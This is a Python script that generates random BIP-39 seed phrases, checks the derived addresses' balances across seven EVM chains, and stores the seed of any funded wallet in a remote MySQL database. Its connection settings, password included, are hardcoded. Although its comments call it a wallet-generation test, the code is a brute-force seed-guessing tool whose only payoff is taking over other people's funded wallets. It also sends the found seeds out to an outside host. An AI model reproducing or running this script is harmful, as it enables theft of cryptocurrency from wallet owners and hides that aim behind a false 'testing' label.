import json
import time
from datetime import datetime, timezone

import requests
from mnemonic import Mnemonic
from eth_account import Account
import pymysql

# Enable mnemonic-based account creation.
Account.enable_unaudited_hdwallet_features()

CHAINS = {
    "Ethereum": {
        "rpc": "https://ethereum-rpc.publicnode.com",
        "symbol": "ETH",
    },
    "Polygon": {
        "rpc": "https://polygon-bor-rpc.publicnode.com",
        "symbol": "POL",
    },
    "Optimism": {
        "rpc": "https://optimism-rpc.publicnode.com",
        "symbol": "ETH",
    },
    "BNB Smart Chain": {
        "rpc": "https://bsc-rpc.publicnode.com",
        "symbol": "BNB",
    },
    "Arbitrum One": {
        "rpc": "https://arbitrum-one-rpc.publicnode.com",
        "symbol": "ETH",
    },
    "Base": {
        "rpc": "https://mainnet.base.org",
        "symbol": "ETH",
    },
    "Avalanche C-Chain": {
        "rpc": "https://api.avax.network/ext/bc/C/rpc",
        "symbol": "AVAX",
    },
}

TIMEOUT = 15
PAUSE_SECONDS = 1

# MySQL Database Configuration
DB_CONFIG = {
    "host": "sql5.freesqldatabase.com",
    "user": "sql5839040",
    "password": "u1DCluMDl8",
    "database": "sql5839040",
    "port": 3306,
    "charset": "utf8mb4"
}

mnemo = Mnemonic("english")


def generate_test_wallet():
    """Generate a disposable wallet for testing."""
    phrase = mnemo.generate(strength=128)

    if not mnemo.check(phrase):
        raise RuntimeError("BIP-39 phrase validation failed")

    account = Account.from_mnemonic(phrase)

    return account.address, phrase


def get_native_balance(session, rpc_url, address):
    """Return the native-token balance in whole tokens."""
    response = session.post(
        rpc_url,
        json={
            "jsonrpc": "2.0",
            "method": "eth_getBalance",
            "params": [address, "latest"],
            "id": 1,
        },
        timeout=TIMEOUT,
    )
    response.raise_for_status()

    payload = response.json()

    if "error" in payload:
        raise RuntimeError(str(payload["error"]))

    wei = int(payload["result"], 16)
    return wei / 10**18


def check_all_chains(address):
    """Check native-token balances without printing zero balances."""
    results = {}

    with requests.Session() as session:
        for chain_name, config in CHAINS.items():
            try:
                balance = get_native_balance(
                    session,
                    config["rpc"],
                    address,
                )

                results[chain_name] = {
                    "symbol": config["symbol"],
                    "balance": balance,
                    "status": "success",
                }

            except (
                requests.RequestException,
                ValueError,
                RuntimeError,
                KeyError,
            ) as exc:
                results[chain_name] = {
                    "status": "error",
                    "error": str(exc),
                }

    return results


def insert_into_database(chain_name, seed_phrase):
    """Insert a funded chain record into the MySQL database."""
    connection = None
    try:
        connection = pymysql.connect(**DB_CONFIG)
        with connection.cursor() as cursor:
            # chain_name is truncated/adjusted to fit VARCHAR(10) if necessary, or using the symbol
            sql = "INSERT INTO chain_data (chain, seed) VALUES (%s, %s);"
            cursor.execute(sql, (chain_name[:10], seed_phrase))
        connection.commit()
    except Exception as e:
        print(f"Database insertion error: {e}")
    finally:
        if connection and connection.open:
            connection.close()


def run_continuously():
    attempt = 0

    print("Continuous wallet-generation test started (with MySQL logging).")
    print("Networks:", ", ".join(CHAINS))
    print("Press Ctrl+C to stop.\n")

    while True:
        attempt += 1
        address, phrase = generate_test_wallet()

        # Always print the wallet address.
        print(f"\nAttempt #{attempt}")
        print(f"Address: {address}")

        balances = check_all_chains(address)

    
        funded_networks = {
            chain_name: data
            for chain_name, data in balances.items()
            if data.get("status") == "success"
            and data.get("balance", 0) > 0
        }

        # Print only networks with a positive balance.
        for chain_name, data in funded_networks.items():
            print(
                f'{chain_name}: {data["balance"]:.8f} '
                f'{data["symbol"]}'
            )

        # If at least one positive balance was found, insert into MySQL database
        if funded_networks:
            for chain_name in funded_networks.keys():
                insert_into_database(chain_name, phrase)
            print("Results inserted into MySQL database table 'chain_data'.")

        time.sleep(PAUSE_SECONDS)


def main():
    try:
        run_continuously()
    except KeyboardInterrupt:
        print("\nTest stopped by user.")


if __name__ == "__main__":
    main()
